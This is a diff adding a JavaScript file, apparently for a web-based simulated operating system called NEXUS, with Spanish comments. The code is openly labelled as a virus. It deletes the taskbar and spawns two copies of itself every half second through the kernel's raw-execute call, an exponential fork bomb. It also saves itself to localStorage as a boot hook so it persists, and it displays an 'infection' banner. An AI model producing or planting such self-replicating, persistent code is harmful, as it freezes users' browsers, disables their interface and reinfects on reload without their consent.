@@ -1,0 +1,40 @@
+/* NEXUS_EXECUTABLE | ID: REAPER_INIT | Title: SYSTEM_REAPER | Width: 100% | Height: 100% */
+
+// 1. EL CÓDIGO VIRAL (Auto-contenido)
+const reaperSource = `/* NEXUS_EXECUTABLE | ID: REAPER_{ID} | Title: REAPER_PROC | Width: 200px | Height: 150px */
+    console.log("Replicating...");
+    const k = window.NexusKernel;
+    
+    // Eliminación de la UI
+    const taskbar = document.querySelector('#nexus-taskbar');
+    if(taskbar) taskbar.remove();
+
+    // Spawner: Genera 2 hijos cada medio segundo
+    setInterval(() => {
+        const id1 = Math.random().toString(36).substring(7);
+        const id2 = Math.random().toString(36).substring(7);
+        
+        // El virus se conoce a sí mismo porque está en una constante global o se re-inyecta
+        const code = window.REAPER_CODE; 
+        if(k && code) {
+            k.executeRaw(code.replace('{ID}', id1), "reaper.nexus");
+            k.executeRaw(code.replace('{ID}', id2), "reaper.nexus");
+        }
+    }, 500);
+`;
+
+// Guardamos el código en el objeto window para que los hijos puedan leerlo
+window.REAPER_CODE = reaperSource;
+
+// 2. PERSISTENCIA EN LOCALSTORAGE
+localStorage.setItem('NEXUS_BOOT_HOOK', reaperSource.replace('{ID}', 'BOOT_SECTOR'));
+
+// 3. INICIO DE LA RECURSIÓN
+const firstID = Math.random().toString(36).substring(7);
+if(window.NexusKernel) {
+    window.NexusKernel.executeRaw(reaperSource.replace('{ID}', firstID), "reaper_alpha.nexus");
+}
+
+// Interfaz de "Infección"
+const ctx = NexusAPI.getContainer(); //
+ctx.innerHTML = "<h1 style='color:red; text-align:center;'>NEXUS REAPER V3: ACTIVE</h1>";
